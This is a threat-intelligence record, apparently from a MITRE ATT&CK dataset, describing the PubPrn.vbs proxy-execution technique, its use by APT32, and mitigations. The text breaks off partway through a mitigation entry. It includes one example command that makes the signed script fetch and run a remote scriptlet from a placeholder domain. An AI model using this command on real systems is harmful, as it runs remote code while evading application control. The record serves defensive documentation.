{"TTP_id": "enterprise-TA0005-T1216-T1216.001", "TTP_name": "PubPrn", "Description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via Cscript.exe. For example, the following code publishes a printer within the specified domain: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com.[1]Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.[2] To do so, adversaries may set the second script: parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.In later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to LDAP://, vice the script: moniker which could be used to reference remote code via HTTP(S).", "Property": {"ID": "T1216.001", "Sub-technique of": "T1216", "Tactic": "Defense Evasion", "Platforms": "Windows", "Defense Bypassed": "Application Control, Digital Certificate Validation", "Contributors": "Atul Nair, Qualys", "Version": "2.0", "Created": "03 February 2020", "Last Modified": "18 April 2022"}, "Examples": {"G0050": ["https://attack.mitre.org/groups/G0050", "APT32", "APT32 has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.[3]"]}, "Mitigation": {"M1040": ["https://attack.mitre.org/mitigations/M1040", "Behavior Prevention on Endpoint", "On Windows 10, update Windows Defender Application Control policies to include rules that block the older, vulnerable versions of PubPrn.[4]"], "M1038": ["https://attack.mitre.org/mitigations/M1038", "Execution Prevention", "Certain signed scripts that can be used to execute other programs may not be necessary within a given environment.
